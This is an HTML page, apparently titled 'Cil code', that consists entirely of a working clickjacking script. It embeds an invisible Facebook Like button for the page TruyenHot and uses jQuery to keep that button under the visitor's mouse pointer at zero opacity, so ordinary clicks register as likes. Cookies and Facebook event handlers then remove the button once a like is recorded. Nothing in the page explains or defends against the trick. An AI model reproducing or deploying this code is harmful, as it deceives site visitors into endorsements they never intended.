<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" onkeypress="keyfind(event)">
<head prefix="og: http://ogp.me/ns/fb#">
<title>Cil code</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="cookie.js"></script>
<script>
$(document).bind('mousemove', function(e){
    $('#cil_like iframe').css({
       left:  e.pageX - 40,
        top:   e.pageY - 13,
        opacity: 0
    });
});
$(document).ready(function(){
	if(document.cookie.indexOf('cil_cookie')==-1){
		$('body').append('<div id="cil_like"><fb:like href="https://www.facebook.com/TruyenHot" send="false" layout="button_count" width="50" show_faces="false" font="" label="Post"></fb:like></div>');
	}
});
</script>
</head>
<body style="background:#ccc;width:100%;height:100%">
<div id="fb-root"></div>
<script src="http://connect.facebook.net/vi_VN/all.js"></script>
<script>
  FB.init({appId: '391157441015774', status: true,
           cookie: true, xfbml: true});
  FB.Event.subscribe('auth.login', function(response) {
    window.location.reload();
  });
window.fbAsyncInit = function() {
    FB.Event.subscribe('edge.create', function(href, widget) {
    	$('#cil_like').empty();
   	document.cookie="cil_cookie=1; expires=0; path=/";

    });
    FB.Event.subscribe('edge.remove', function(href, widget) {
	document.cookie="cil_cookie=-1; expires=0; path=/";
    });
};
</script>
</body>
</html>
